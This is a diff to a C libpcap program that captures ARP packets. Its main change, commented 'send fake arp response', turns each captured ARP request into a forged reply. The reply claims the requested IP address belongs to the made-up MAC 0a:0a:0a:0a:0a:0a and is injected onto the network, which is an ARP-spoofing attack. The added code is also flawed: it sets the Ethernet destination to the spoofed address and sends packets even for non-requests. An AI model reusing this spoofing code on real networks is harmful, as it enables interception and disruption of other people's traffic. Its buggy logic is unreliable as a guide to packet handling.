@@ -1,4 +1,5 @@
 #include <pcap.h>
+#include <string.h>
 
 struct eth_header
 {
@@ -86,15 +87,16 @@ int main(int argc, char **argv)
 		eptr->ether_shost[5]);
 		
 	struct arp_packet * arpptr = (struct arp_packet *)(packet + 14);
-	printf("Hardware type:%x\n\
+	if(ntohs(arpptr->op) == 1)  // if arp packet is a request packet 
+	{	printf("Hardware type:%x\n\
 Proto	type:%x\n\
 Hardware address len:%x\n\
 Proto address len:%x\n\
 Operator:%x\n\
 Ethernet source address:%x:%x:%x:%x:%x:%x\n\
-Ip	source address:%x.%x.%x.%x\n\
+Ip	 source address:%d.%d.%d.%d\n\
 Ethernet dest address:%x:%x:%x:%x:%x:%x\n\
-Ip	dest address:%x.%x.%x.%x\n",
+Ip	 dest address:%d.%d.%d.%d\n",
 		ntohs(arpptr->hw_type),
 		ntohs(arpptr->proto_type),
 		arpptr->hw_add_len,
@@ -121,6 +123,34 @@ Ip	dest address:%x.%x.%x.%x\n",
 		arpptr->ip_dhost[2],
 		arpptr->ip_dhost[3]);
 
+		//send fake arp response
+		memcpy(eptr->ether_dhost, eptr->ether_shost, 6);
+		eptr->ether_dhost[0] = 0xa;
+		eptr->ether_dhost[1] = 0xa;
+		eptr->ether_dhost[2] = 0xa;
+		eptr->ether_dhost[3] = 0xa;
+		eptr->ether_dhost[4] = 0xa;
+		eptr->ether_dhost[5] = 0xa;	
+	
+		arpptr->op = htons(2);
+		
+		memcpy(arpptr->ether_dhost, arpptr->ether_shost, 6);
+		
+		arpptr->ether_shost[0] = 0xa;
+		arpptr->ether_shost[1] = 0xa;
+		arpptr->ether_shost[2] = 0xa;
+		arpptr->ether_shost[3] = 0xa;
+		arpptr->ether_shost[4] = 0xa;
+		arpptr->ether_shost[5] = 0xa;
+		u_int8_t ip_buffer[4];
+		memcpy(ip_buffer, arpptr->ip_dhost, 4);	
+		memcpy(arpptr->ip_dhost, arpptr->ip_shost, 4);
+		memcpy(arpptr->ip_shost, ip_buffer, 4);
+	}
+	
+	if(pcap_sendpacket(handle, packet, 40) == -1)
+		printf("pacap_sendpacket error\n");
+		
 	//for(i = 0 ; i < header.len; i++) {
 	//	nprintf("%x", packet,);	
 	//}	
